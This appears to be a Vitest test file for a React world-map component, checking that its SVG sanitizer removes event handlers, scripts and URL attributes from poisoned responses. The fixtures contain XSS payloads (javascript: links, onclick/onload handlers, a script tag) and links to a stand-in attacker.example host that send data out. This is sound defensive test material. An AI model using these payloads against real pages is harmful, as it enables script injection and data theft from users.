// @vitest-environment jsdom

import { act, cleanup, render, waitFor } from "@testing-library/react";
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import { WorldMap } from "@/app/alt-pegs/fiat-world-atlas/world-map";
import { mockFetch } from "@shared/test-utils/mock-fetch";

const WORLD_SVG = '<svg viewBox="0 0 900 460"><g class="world-countries"><path id="US" /></g></svg>';

// Flush the fetch -> parse -> sanitize -> adopt microtask chain deterministically.
async function flushAsync() {
  for (let i = 0; i < 4; i += 1) {
    await act(async () => {
      await Promise.resolve();
    });
  }
}

beforeEach(() => {
  mockFetch([{ match: "/maps/world-countries.svg", body: WORLD_SVG }], { requireMatch: true });
});

afterEach(() => {
  cleanup();
  vi.unstubAllGlobals();
});

describe("WorldMap", () => {

  it("strips href/xlink:href and on* attributes from a poisoned SVG response", async () => {
    const POISONED_SVG =
      '<svg viewBox="0 0 1 1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">' +
      '<a href="javascript:alert(1)"><path id="A" onclick="steal()" /></a>' +
      '<image xlink:href="https://attacker.example/?data=x" />' +
      "</svg>";
    mockFetch([{ match: "/maps/world-countries.svg", body: POISONED_SVG }], { requireMatch: true });

    const { container } = render(<WorldMap />);
    await waitFor(() => expect(container.querySelector("svg")).not.toBeNull());

    const svg = container.querySelector("svg")!;
    expect(svg.querySelector("[href]")).toBeNull();
    expect(svg.querySelector("[onclick]")).toBeNull();
    const image = svg.querySelector("image");
    expect(image).not.toBeNull();
    expect(image!.hasAttribute("xlink:href")).toBe(false);
    expect(image!.getAttributeNS("http://www.w3.org/1999/xlink", "href")).toBeNull();
  });

  it("strips root event handlers, nested scripts, and URL-bearing attributes", async () => {
    const POISONED_SVG =
      '<svg viewBox="0 0 1 1" onload="pwn()" xmlns="http://www.w3.org/2000/svg">' +
      "<script>alert(1)</script>" +
      '<g><path id="A" d="M0 0" /><image src="https://attacker.example/x" /><form action="https://attacker.example/y" /></g>' +
      "</svg>";
    mockFetch([{ match: "/maps/world-countries.svg", body: POISONED_SVG }], { requireMatch: true });

    const { container } = render(<WorldMap />);
    await waitFor(() => expect(container.querySelector("svg")).not.toBeNull());

    const svg = container.querySelector("svg")!;
    expect(svg.hasAttribute("onload")).toBe(false);
    expect(svg.querySelector("script")).toBeNull();
    expect(svg.querySelector("[src]")).toBeNull();
    expect(svg.querySelector("[action]")).toBeNull();
    expect(svg.querySelector('path[d="M0 0"]')).not.toBeNull();
  });

  it("does not inject a response whose root element is not an SVG", async () => {
    mockFetch([{ match: "/maps/world-countries.svg", body: "<notsvg>poison</notsvg>" }], { requireMatch: true });

    const { container } = render(<WorldMap />);
    await flushAsync();

    expect(container.querySelector("svg")).toBeNull();
  });

});
